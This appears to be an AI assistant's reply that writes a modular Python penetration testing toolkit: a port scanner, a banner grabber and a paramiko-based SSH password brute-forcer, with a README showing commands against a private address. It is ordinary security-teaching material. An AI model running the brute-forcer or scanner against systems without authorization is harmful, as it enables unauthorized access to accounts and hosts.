Great! Let’s build a **modular penetration testing toolkit** in **Python**, with multiple tools like:

- Port Scanner  
- Brute Force Tool  
- Service Banner Grabber  
- Vulnerability Scanner (basic)  
- Network Sniffer (optional/advanced)  

We’ll break it into modules, and I’ll also include docstrings and documentation-style comments so it's well-documented and ready for expansion.

---

## 🔧 Toolkit Structure

```
pentest_toolkit/
│
├── main.py
├── scanner/
│   ├── __init__.py
│   ├── port_scanner.py
│   └── banner_grabber.py
│
├── brute/
│   ├── __init__.py
│   └── ssh_brute.py
│
├── utils/
│   ├── __init__.py
│   └── helpers.py
│
└── README.md
```

---

### 📁 `main.py`

This is the entry point.

```python
import argparse
from scanner import port_scanner, banner_grabber
from brute import ssh_brute

def main():
    parser = argparse.ArgumentParser(description="Modular Penetration Testing Toolkit")
    subparsers = parser.add_subparsers(dest='module')

    # Port Scanner
    port_parser = subparsers.add_parser('portscan', help='Run port scanner')
    port_parser.add_argument('target', help='Target IP or hostname')
    port_parser.add_argument('--ports', default='1-1024', help='Port range (e.g., 20-80)')

    # Banner Grabber
    banner_parser = subparsers.add_parser('banner', help='Banner grabbing')
    banner_parser.add_argument('target', help='Target IP')
    banner_parser.add_argument('port', type=int, help='Target port')

    # SSH Brute Force
    brute_parser = subparsers.add_parser('bruteforce', help='Brute-force SSH login')
    brute_parser.add_argument('host', help='Target IP')
    brute_parser.add_argument('user', help='Username')
    brute_parser.add_argument('wordlist', help='Path to password wordlist')

    args = parser.parse_args()

    if args.module == 'portscan':
        port_scanner.scan_ports(args.target, args.ports)
    elif args.module == 'banner':
        banner_grabber.grab_banner(args.target, args.port)
    elif args.module == 'bruteforce':
        ssh_brute.brute_force_ssh(args.host, args.user, args.wordlist)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
```

---

### 📁 `scanner/port_scanner.py`

```python
import socket
from utils.helpers import parse_ports

def scan_ports(host, ports):
    port_range = parse_ports(ports)
    print(f"[+] Scanning {host} on ports {ports}")
    for port in port_range:
        try:
            sock = socket.socket()
            sock.settimeout(0.5)
            sock.connect((host, port))
            print(f"[+] Port {port} is OPEN")
            sock.close()
        except:
            pass
```

---

### 📁 `scanner/banner_grabber.py`

```python
import socket

def grab_banner(ip, port):
    try:
        sock = socket.socket()
        sock.settimeout(2)
        sock.connect((ip, port))
        banner = sock.recv(1024).decode().strip()
        print(f"[+] Banner from {ip}:{port} --> {banner}")
        sock.close()
    except Exception as e:
        print(f"[-] Failed to grab banner: {e}")
```

---

### 📁 `brute/ssh_brute.py`

```python
import paramiko

def brute_force_ssh(host, username, wordlist_path):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open(wordlist_path, 'r') as file:
        for password in file:
            password = password.strip()
            try:
                ssh.connect(host, username=username, password=password, timeout=3)
                print(f"[+] SUCCESS: {username}:{password}")
                return
            except paramiko.AuthenticationException:
                print(f"[-] Failed: {username}:{password}")
            except Exception as e:
                print(f"[!] Error: {e}")
    print("[-] Brute-force complete. No valid credentials found.")
```

---

### 📁 `utils/helpers.py`

```python
def parse_ports(port_str):
    if '-' in port_str:
        start, end = map(int, port_str.split('-'))
        return range(start, end + 1)
    else:
        return [int(port_str)]
```

---

### 📄 `README.md`

```markdown
# Penetration Testing Toolkit 🛠️

A modular Python-based toolkit for penetration testing.

## Modules

- **Port Scanner**: Scans ports on a target host.
- **Banner Grabber**: Retrieves service banners.
- **SSH Brute Forcer**: Brute-forces SSH login using a wordlist.

## Usage

```bash
python main.py portscan 192.168.1.1 --ports 22-80
python main.py banner 192.168.1.1 22
python main.py bruteforce 192.168.1.1 root passwords.txt
```

## Requirements

- `paramiko` for SSH module
```

---

## ✅ Next Steps

Would you like to:

1. Add more modules like a **simple vulnerability scanner** or **HTTP directory brute-forcer**?
2. Package it as a CLI tool with installable options?
3. Convert it to use threads/async for speed?

Let me know how deep you want to go with it!